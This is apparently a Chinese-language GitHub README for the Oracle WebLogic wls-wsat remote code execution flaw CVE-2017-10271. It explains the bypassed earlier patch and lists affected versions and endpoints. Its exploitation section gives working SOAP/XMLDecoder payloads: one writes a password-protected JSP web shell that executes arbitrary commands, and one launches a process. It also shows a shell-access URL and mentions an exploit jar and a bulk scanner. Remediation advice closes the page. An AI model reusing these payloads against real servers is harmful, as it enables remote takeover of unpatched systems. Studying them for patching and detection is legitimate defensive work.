# Oracle-WebLogic-CVE-2017-10271
WebLogic wls-wsat RCE CVE-2017-10271

## 漏洞描述

mitre:http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-3506

早期，黑客利用WebLogic WLS 组件漏洞对企业服务器发起大范围远程攻击，有大量企业的服务器被攻陷，且被攻击企业数量呈现明显上升趋势，需要引起高度重视。其中，CVE-2017-3506是一个利用Oracle WebLogic中WLS 组件的远程代码执行漏洞，属于没有公开细节的野外利用漏洞，大量企业尚未及时安装补丁。官方在 2017 年 4 月份就发布了该漏洞的补丁。

CVE-2017-3506补丁说明：

```
public WorkContextXmlInputAdapter(InputStream is)
  {
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    try
    {
      int next = 0;
      next = is.read();
      while (next != -1)
      {
        baos.write(next);
        next = is.read();
      }
    }
    catch (Exception e)
    {
      throw new IllegalStateException("Failed to get data from input stream", e);
    }
    validate(new ByteArrayInputStream(baos.toByteArray()));
    this.xmlDecoder = new XMLDecoder(new ByteArrayInputStream(baos.toByteArray()));
  }
  
  private void validate(InputStream is)
  {
    WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
    try
    {
      SAXParser parser = factory.newSAXParser();
      parser.parse(is, new DefaultHandler()
      {
        public void startElement(String uri, String localName, String qName, Attributes attributes)
          throws SAXException
        {
          if (qName.equalsIgnoreCase("object")) {
            throw new IllegalStateException("Invalid context type: object");
          }
        }
      });
    }
    catch (ParserConfigurationException e)
    {
      throw new IllegalStateException("Parser Exception", e);
    }
    catch (SAXException e)
    {
      throw new IllegalStateException("Parser Exception", e);
    }
    catch (IOException e)
    {
      throw new IllegalStateException("Parser Exception", e);
    }
  }
```

只是在反序列化之前增加了一个validate函数,如果qName等于object，就抛出异常终止。可谓简单暴力，然而，这里的黑名单这种修复，很难彻底修复完整。值得深思…

该漏洞的利用方法较为简单，攻击者只需要发送精心构造的 HTTP 请求，就可以拿到目标服务器的权限，危害巨大。由于漏洞较新，目前仍然存在很多主机尚未更新相关补丁。预计在此次突发事件之后，很可能出现攻击事件数量激增，大量新主机被攻陷的情况。

Oracle官方4月份补丁对CVE-2017-3506该漏洞修复不彻底，可以绕过补丁，依旧执行远程命令。CVE-2017-10271目前绕过的漏洞在官方发布的10月份的补丁中已修复。

## 漏洞编号

CVE-2017-10271 （wls-wsat 远程命令执行绕过漏洞）

## 影响版本

Oracle WebLogic Server10.3.6.0.0 版本

Oracle WebLogic Server12.1.3.0.0 版本

Oracle WebLogic Server12.2.1.1.0 版本

Oracle WebLogic Server12.2.1.2.0 版本

## wls-wsat目录列表

```
/wls-wsat/CoordinatorPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/ParticipantPortType
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/RegistrationRequesterPortType11
```

## 利用方法

#### Poc：

##### CmdShell

```
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string><void method="println"><string><![CDATA[<%   if("secfree".equals(request.getParameter("password"))){  
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("command")).getInputStream();  
        int a = -1;  
        byte[] b = new byte[2048];  
        out.print("<pre>");  
        while((a=in.read(b))!=-1){  
            out.println(new String(b));  
        }  
        out.print("</pre>");  
    } %>]]></string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
```
![exploit](https://raw.githubusercontent.com/iBearcat/Oracle-WebLogic-CVE-2017-10271/master/img/1.jpg)

CmdShell : http://www.xxx.com/bea_wls_internal/test.jsp?password=secfree&command=whoami

![exploit](https://raw.githubusercontent.com/iBearcat/Oracle-WebLogic-CVE-2017-10271/master/img/2.jpg)

##### 执行命令
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
            <java version="1.6.0" class="java.beans.XMLDecoder">
                <object class="java.lang.ProcessBuilder"> 
                    <array class="java.lang.String" length="1">
                       <void index="0">
                        <string>calc</string>
                    </void>
                    </array>
                <void method="start"/> 
                </object>
            </java> 
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/> 
</soapenv:Envelope>
```
![exploit](https://raw.githubusercontent.com/iBearcat/Oracle-WebLogic-CVE-2017-10271/master/img/3.jpg)

#### 使用Exp获得一个CmdShell

##### WebLogic_Wls-Wsat_RCE_Exp.jar

![exploit](https://raw.githubusercontent.com/iBearcat/Oracle-WebLogic-CVE-2017-10271/master/img/4.jpg)

#### 资产批量检测

##### WebLogic-Wls-wsat-XMLDecoder
![exploit](https://raw.githubusercontent.com/iBearcat/Oracle-WebLogic-CVE-2017-10271/master/img/5.jpg)
![exploit](https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271/blob/master/img/6.jpg?raw=true)

## 修复建议

1.升级Oracle 10月份补丁。

  http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html
  https://lipeng1943.com/download/weblogic_patch-catalog_25504.zip

2.对访问wls-wsat的资源进行访问控制。

3.临时解决方案

  在不影响业务前提下，根据实际环境路径，删除WebLogic程序下列war包及目录。
```
rm -f/home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war
rm -f/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
rm -rf/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
```
重启WebLogic服务或系统后，确认以下链接访问是否为404：

http://ip:port/wls-wsat/CoordinatorPortType11
